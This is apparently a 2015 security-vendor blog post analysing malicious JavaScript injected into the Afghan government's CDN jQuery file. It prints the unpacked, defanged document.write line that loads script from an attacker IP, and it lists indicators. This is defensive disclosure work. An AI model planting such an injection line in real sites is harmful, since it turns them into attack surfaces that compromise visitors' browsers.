Afghan Government Compromise: Browser Beware
Posted on June 12, 2015 by Steven Adair
Visiting a wide-ranging number of websites associated with the Government of Afghanistan may yield visitors an
unwanted surprise. For the second time this year, malicious code has surfaced on, cdn.afghanistan.af, a host that
serves as a content delivery network (CDN) for the Afghan government. Javascript code from this system is found on
several different Afghan Offices, Ministries, and Authorities. This strategic web compromise (SWC) against the Afghan
CDN server has effectively turned a large portion of the government’s websites into attack surfaces against visitors.
Volexity recently detected malicious code being loaded after a user visited the websites for the President of
Afghanistan (www.president.gov.af).

Second Round of Attacks
In a previous attack highlighted earlier in the year by ThreatConnect. One of the two primary Javascript files accessed
from the CDN system was modified to load code from two different malicious URLs. In the past attacks, the following
file was modified to load unwanted Javascript:

http://cdn.afghanistan.af/scripts/gop-script.js
In these instances the offending code was easily identifiable, as the attackers simply prepended document.write
statements to the very top of the gop-script.js file as seen below:

However, this new round of malicious code has two primary differences. The first difference is the attackers chose to
modify a different file in this round. The offending code is no longer present in gop-script.js, as this file was cleaned
up some time ago. However, malicious code is now found in the following Javascript code on the Afghan CDN
website:

http://cdn.afghanistan.af/scripts/jquery-1.4.2.min.js
The next major difference is the attackers went through more of an effort to obfuscate their activity by appending
their code to the end of the file and by leveraging the Dean Edwards Packer with base62 encoding. In this instance,
the packer effectively makes it more difficult to discern exactly what the attackers have done just by looking at the
code. The image below shows the malicious code as it currently appears within the jquery-1.4.2.min.js file:

Taking this Javascript and unpacking it results in a bit more recognizable code (note we have modified http to hxxp
below):

document.write(‘<script type=”text/javascript” src=\”hxxp://176.58.101.24/Jquery/Jquery.js\”></script>’);
This code will cause a visitor to attempt to retrieve Javascript from the Linode IP address 176.58.101.24 and load it into
the browser.

Selective Exploitation
One of the more interesting tactics that APT attackers have been employing in recent years is the usage of IP address
whitelisting. Volexity believes that the attackers behind the Afghan Government compromise likely have a specific set
of targets that are potential recipients of malicious code via the 176.58.101.24 address. In all observed instances thus
far, only HTTP 403 (Forbidden) responses have been observed. This threat group has used similar tactics on other
websites involved in strategic web compromises in the past as well. The only real way to identify the targets is to
observe the code actually being seen, or see the whitelist from the server itself. At this point we can only speculate
that Government and Defense entities are likely the intended targets of this campaign. If you check your logs and find
HTTP 200 results, we would like to hear from you.

Network Indicators
The most straightforward and primary network indicator at this time is looking for for communication with the IP
address 176.58.101.24. ASN details via the Shadowserver IP-BGP service are shown below.

$ whois -h asn.shadowserver.org ‘origin 176.58.101.24’
